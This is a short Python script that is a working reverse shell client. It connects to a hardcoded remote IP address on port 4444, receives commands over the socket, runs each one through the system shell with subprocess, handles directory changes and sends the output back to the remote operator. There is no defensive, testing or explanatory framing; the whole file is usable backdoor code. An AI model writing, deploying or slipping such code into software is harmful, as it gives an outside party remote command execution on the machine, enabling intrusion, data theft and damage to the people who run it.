import socket
import subprocess
import os

# Configuration for connecting to the server
host = "18.217.147.188"  # replace with your server IP
port = 4444  # ensure this matches the server's port

client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client_socket.connect((host, port))

try:
    while True:
        command = client_socket.recv(1024).decode("utf-8")
        if command.lower() == "exit":
            print("Closing connection.")
            break
        
        # Handle 'cd' command separately for directory changes
        if command.startswith("cd "):
            try:
                os.chdir(command[3:].strip())
                response = f"Changed directory to {os.getcwd()}"
            except Exception as e:
                response = f"Error: {str(e)}"
        else:
            # Execute other commands
            try:
                output = subprocess.run(command, shell=True, capture_output=True, text=True, timeout=10)
                response = output.stdout + output.stderr  # capture both stdout and stderr
            except subprocess.TimeoutExpired:
                response = "Error: Command timed out."
            except Exception as e:
                response = f"Error: {str(e)}"
        
        # Send response back to server
        client_socket.send(response.encode("utf-8"))
except Exception as e:
    print(f"An error occurred: {e}")
finally:
    client_socket.close()
